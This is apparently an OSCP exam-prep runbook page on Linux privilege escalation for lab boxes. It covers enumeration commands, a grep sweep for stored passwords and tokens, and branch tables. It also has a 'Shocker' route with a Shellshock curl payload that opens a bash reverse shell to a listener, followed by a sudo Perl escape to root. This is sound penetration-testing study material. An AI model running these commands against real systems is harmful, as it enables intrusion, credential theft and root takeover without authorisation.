# Linux Fast Path

Use this page after a Linux shell or a confirmed Linux service path. The order is direct privilege checks, credential reuse, scheduled jobs, SUID and capabilities, then unusual services and kernel work.

## Fast loop

### Run this

~~~bash
id
whoami
hostname
uname -a
sudo -l
find / -perm -4000 -type f -ls 2>/dev/null | tee "$BoxDir/loot/suid.txt"
getcap -r / 2>/dev/null | tee "$BoxDir/loot/capabilities.txt"
cat /etc/crontab
ss -lntup 2>/dev/null
~~~

### Example output

~~~text
uid=$UID($Username) gid=$GID($Group) groups=$Groups
User $Username may run the following commands:
    (root) NOPASSWD: $AllowedCommand
~~~

### What did you get?

- [ ] `sudo -l` gives an interpreter or unrestricted command -> **Open [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux Sudo Check]].**
- [ ] A credential appears in application files -> **Validate it once, then open [[OSCP/RUNBOOK V2/Linux - Credential Search|Linux Credential Search]].**
- [ ] Root-run writable script, timer, or cron entry -> **Open [[OSCP/RUNBOOK V2/Linux - Cron Check|Linux Cron Check]].**
- [ ] Unusual SUID or capability -> **Open [[OSCP/RUNBOOK V2/Linux - SUID Check|Linux SUID Check]].**
- [ ] A loopback service is the next lead -> **Open [[OSCP/RUNBOOK V2/Linux - Local Enum|Linux Local Enum]] or the port-forwarding stage.**
- [ ] Nothing is confirmed -> **Run LinPEAS as a second pass, then return to the first matching branch.**
- [ ] Root is confirmed -> **Open [[OSCP/EXAM RUNBOOK/08 - Evidence and Clean Down|Evidence and Clean Down]].**

### Open next

Choose exactly one privilege branch from the output. Do not jump to kernel work while a direct sudo, credential, cron, SUID, capability, or local-service path remains untested.

## 1. Confirm the shell

~~~bash
id
whoami
hostname
uname -a
ip a
ss -lntup
~~~

If the shell is unstable, open [[OSCP/RUNBOOK V2/Linux - Shell Stabilise|Linux Shell Stabilise]] before continuing.

## 2. Fast local triage

~~~bash
sudo -l
find / -perm -4000 -type f -ls 2>/dev/null | tee "$BoxDir/loot/suid.txt"
getcap -r / 2>/dev/null | tee "$BoxDir/loot/capabilities.txt"
cat /etc/crontab
find /etc/cron* /var/spool/cron /home -type f -writable -ls 2>/dev/null | tee "$BoxDir/loot/writable-scheduled.txt"
ps auxww
systemctl list-timers --all 2>/dev/null
~~~

## 3. Credential and application search

~~~bash
grep -RniE 'password|passwd|secret|token|api[_-]?key|private[_-]?key' \
  /var/www /opt /srv /home /etc 2>/dev/null | tee "$BoxDir/loot/credential-hits.txt"
find /var/www /opt /srv /home -type f \( -name '*.conf' -o -name '*.config' -o -name '*.ini' -o -name '*.env' -o -name '*.bak' -o -name '*.old' \) -readable -print \
  | tee "$BoxDir/loot/config-files.txt"
~~~

Validate one likely credential with the service suggested by its source:

~~~bash
ssh "$Username@$BoxIP"
~~~

## 4. Fast enumeration fallback

Run LinPEAS only after the direct checks, and save its output. Use it to prioritise a lead, then reproduce the finding manually.

~~~bash
"$LinPEAS" 2>&1 | tee "$BoxDir/loot/linpeas.txt"
~~~

## Branches

| Output | Fast next action |
|---|---|
| sudo permits all commands or an interpreter | Run `sudo -l`, use the exact permitted path, then `sudo -i`; open [[OSCP/RUNBOOK V2/Linux - Sudo Check\|Linux - Sudo Check]] |
| Candidate credential found | Validate once over SSH or the named service; open [[OSCP/RUNBOOK V2/Linux - Credential Search\|Linux - Credential Search]] |
| Writable root-run script or timer | Confirm owner, trigger, and execution identity; open [[OSCP/RUNBOOK V2/Linux - Cron Check\|Linux - Cron Check]] |
| SUID binary is unusual or custom | Run `file`, `strings`, `checksec`, and `objdump`; open [[OSCP/RUNBOOK V2/Linux - SUID Check\|Linux - SUID Check]] |
| Capability grants setuid or similar power | Confirm the exact capability and use the matching binary path; open [[OSCP/RUNBOOK V2/Linux - SUID Check\|Linux - SUID Check]] |
| lxd or docker group appears | Check for a direct sudo path first, then open [[OSCP/RUNBOOK V2/Linux - Local Enum\|Linux - Local Enum]] |
| No safer path and kernel is clearly vulnerable | Match distribution, kernel, architecture, and exploit prerequisites; open [[OSCP/RUNBOOK V2/Linux - Kernel Exploit\|Linux - Kernel Exploit]] |
| Root proof is confirmed | Capture proof privately, then [[OSCP/EXAM RUNBOOK/08 - Evidence and Clean Down\|Evidence and Clean Down]] |

## Shocker CGI to Perl route

Use this compact route when the web branch proves a Bash CGI header injection:

~~~bash
# Catch the callback after the identity proof succeeds.
nc -lvnp "$Lport"

curl --max-time 10 -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
  -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1"

# Confirm the landed identity.
id
whoami
hostname

# Read the exact sudo rule, then use the approved Perl interpreter.
sudo -n -l
sudo /usr/bin/perl -e 'exec "/bin/bash";'

# Prove the privileged identity.
id
whoami
~~~

The callback request may time out after the shell connects. Stabilise the terminal with [[OSCP/RUNBOOK V2/Linux - Shell Stabilise|Linux Shell Stabilise]], then continue to [[OSCP/EXAM RUNBOOK/08 - Evidence and Clean Down|Evidence and Clean Down]]. See [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]].

## Write-up examples

- [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]] -- password reuse, SSH, groups, and unrestricted sudo
- [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]] -- sudo interpreter pivot, writable MOTD, and SUID Bash
- [[OSCP/BOXES/WRITE UPS/Linux/CronOS|CronOS]] -- command injection and writable root scheduler
- [[OSCP/BOXES/WRITE UPS/Linux/Mirai|Mirai]] -- default credential validation and direct sudo
- [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]] -- CGI Shellshock callback and exact passwordless Perl sudo

## Detailed routes

- [[OSCP/MODULES/18. Linux Privilege Escalation|Module 18 - Linux Privilege Escalation]]
- [[OSCP/DECISION TREE/Linux Privilege Escalation (Decision Tree)|Linux Privilege Escalation Decision Tree]]
- [[OSCP/COMMAND APPENDIX/Linux Privilege Escalation|Linux Privilege Escalation Command Appendix]]
